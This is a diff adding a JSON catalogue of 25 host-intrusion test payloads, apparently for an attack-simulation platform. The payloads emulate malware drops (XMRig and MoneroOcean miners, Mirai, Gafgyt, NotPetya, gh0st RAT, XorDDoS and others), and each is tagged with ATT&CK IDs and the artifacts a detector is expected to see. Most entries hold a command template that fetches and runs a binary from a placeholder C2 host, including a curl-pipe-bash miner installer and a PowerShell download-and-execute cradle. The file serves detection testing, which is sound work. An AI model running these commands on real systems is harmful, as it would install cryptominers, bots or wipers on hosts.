@@ -1,0 +1,931 @@
+[
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: XMRig miner ELF",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "XMRig 门罗币挖矿（最常见 Linux 挖矿）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1496"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o pool.example.com:3333 -u {{WALLET}}",
+    "hids_artifact_path": "/tmp/xmrig",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/xmrig",
+      "proc:/tmp/xmrig"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: MoneroOcean miner",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "MoneroOcean 一键挖矿脚本。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1496"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "command",
+    "hids_command_template": "curl -s https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s {{WALLET}}",
+    "hids_artifact_path": "/etc/systemd/system/moneroocean_miner.service",
+    "hids_expected_artifacts": [
+      "file_create:moneroocean_service"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: T-rex miner",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "T-rex NVIDIA GPU 挖矿。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1496"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/t-rex && /tmp/t-rex -a ethash -o stratum+tcp://pool:4444 -u {{WALLET}}",
+    "hids_artifact_path": "/tmp/t-rex",
+    "hids_expected_artifacts": [
+      "proc:t-rex"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Mirai bot variant",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Mirai IoT botnet 投递。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/mirai.arm -O /tmp/mirai && chmod +x /tmp/mirai && /tmp/mirai",
+    "hids_artifact_path": "/tmp/mirai",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/mirai",
+      "proc:mirai"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: BashLite / Gafgyt",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "BashLite/Gafgyt 老牌 IoT bot。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/bashlite -O /tmp/bl && chmod +x /tmp/bl && /tmp/bl",
+    "hids_artifact_path": "/tmp/bl",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/bl"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Tsunami / Kaiten",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Tsunami IRC-controlled bot。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/tsunami -O /tmp/t && chmod +x /tmp/t && /tmp/t",
+    "hids_artifact_path": "/tmp/t",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/t",
+      "tcp_outbound:irc"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: MozI bot",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "MozI P2P bot。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/mozi -O /tmp/m && /tmp/m",
+    "hids_artifact_path": "/tmp/m",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/m"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Smominru / MyKings",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Smominru Windows mining + worm。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1496"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/wuauclt.exe -O %TEMP%\\\\wuauclt.exe & %TEMP%\\\\wuauclt.exe",
+    "hids_artifact_path": "%TEMP%\\wuauclt.exe",
+    "hids_expected_artifacts": [
+      "file_create:wuauclt.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Adylkuzz",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Adylkuzz 通过 EternalBlue 传播挖矿。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1496"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "Adylkuzz.exe -o pool:3333",
+    "hids_artifact_path": "Adylkuzz.exe",
+    "hids_expected_artifacts": [
+      "proc:Adylkuzz.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: WannaMine",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "WannaMine WMI + EternalBlue 持久化挖矿。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1496"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "command",
+    "hids_command_template": "powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://{{C2_HOST}}/wm.ps1')\"",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:powershell.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Linux/Liloi",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Liloi worm Linux 蠕虫挖矿组合。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "command",
+    "hids_command_template": "wget http://{{C2_HOST}}/liloi.sh | sh",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:sh"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: ShellBot Perl",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "ShellBot perl IRC bot 老牌 RCE 投递。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1059.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "command",
+    "hids_command_template": "perl shellbot.pl irc.example.org 6667",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:perl"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: BillGates DDoS",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "BillGates ELF DDoS bot。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/billgates -O /tmp/bg && /tmp/bg",
+    "hids_artifact_path": "/tmp/bg",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/bg"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: China.Z worm",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "China.Z Linux 自传播 ELF worm。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/chinaz -O /tmp/cz && /tmp/cz",
+    "hids_artifact_path": "/tmp/cz",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/cz"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Elknot DDoS",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Elknot/BillGates 早期变种 ELF。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/elknot -O /tmp/ek && /tmp/ek",
+    "hids_artifact_path": "/tmp/ek",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/ek"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Linux/Tsunami",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Linux/Tsunami IRC-controlled DDoS bot。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/tsu -O /tmp/tsu && /tmp/tsu",
+    "hids_artifact_path": "/tmp/tsu",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/tsu"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Spike trojan",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Spike Linux trojan / DDoS botnet。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/spike -O /tmp/sp && /tmp/sp",
+    "hids_artifact_path": "/tmp/sp",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/sp"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: gh0st linux variant",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "gh0st RAT linux compiled variant。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/gh0st_linux -O /tmp/g && /tmp/g",
+    "hids_artifact_path": "/tmp/g",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/g"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: NotPetya dropper",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "NotPetya Windows wiper + Mimikatz 投递（仿真）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1485"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/perfc.dat -O %TEMP%\\\\perfc.dat & rundll32 %TEMP%\\\\perfc.dat,#1",
+    "hids_artifact_path": "%TEMP%\\perfc.dat",
+    "hids_expected_artifacts": [
+      "file_create:perfc.dat",
+      "proc:rundll32.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Conficker",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Conficker downloader 仿真（老经典 ms08_067 + DGA）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "conficker_simulator.exe",
+    "hids_artifact_path": "conficker_simulator.exe",
+    "hids_expected_artifacts": [
+      "proc:conficker_simulator.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Wirenet RAT",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Wirenet 跨平 RAT，Linux 桌面密码窃取。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1555"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/wirenet -O /tmp/wn && /tmp/wn",
+    "hids_artifact_path": "/tmp/wn",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/wn"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Hidden Cobra ELF",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hidden Cobra（朝鲜 APT）ELF dropper。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1219"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/hc -O /tmp/hc && /tmp/hc",
+    "hids_artifact_path": "/tmp/hc",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/hc"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Crackonosh",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Crackonosh 通过盗版游戏分发的挖矿。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1496"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "crackonosh_setup.exe /silent",
+    "hids_artifact_path": "crackonosh_setup.exe",
+    "hids_expected_artifacts": [
+      "proc:crackonosh_setup.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: XorDDoS",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "XorDDoS Linux 恶意软件 + DDoS botnet。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1583.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/xorddos -O /tmp/xd && /tmp/xd",
+    "hids_artifact_path": "/tmp/xd",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/xd"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Virus Sample Drop: Linux.Helminth",
+    "payload_external_id": "HIDS-VIRUSSAMPLEDROP-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Helminth APT 持久化 + 凭证窃取。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1555"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "virus_sample_drop"
+    ],
+    "hids_category": "virus_sample_drop",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "wget http://{{C2_HOST}}/helminth -O /tmp/he && /tmp/he",
+    "hids_artifact_path": "/tmp/he",
+    "hids_expected_artifacts": [
+      "file_create:/tmp/he"
+    ]
+  }
+]
